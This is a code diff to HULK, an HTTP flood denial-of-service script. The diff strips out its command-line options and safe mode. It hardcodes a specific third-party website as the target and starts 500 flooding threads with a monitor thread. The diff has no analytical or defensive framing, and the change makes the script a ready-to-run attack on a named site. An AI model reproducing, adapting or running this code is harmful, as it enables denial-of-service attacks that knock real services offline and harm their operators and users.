@@ -122,26 +122,13 @@ class MonitorThread(threading.Thread):
 		if flag==2:
 			print "\n-- HULK Attack Finished --"
 
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	#sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		print "-- HULK Started --"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
+url = "http://piter.evacuatora.ru/"
+if url.count("/")==2:
+	url = url + "/"
+m = re.search('(https?\://)?([^/]*)/?.*', url)
+host = m.group(2)
+for i in range(500):
+	t = HTTPThread()
+	t.start()
+t = MonitorThread()
+t.start()
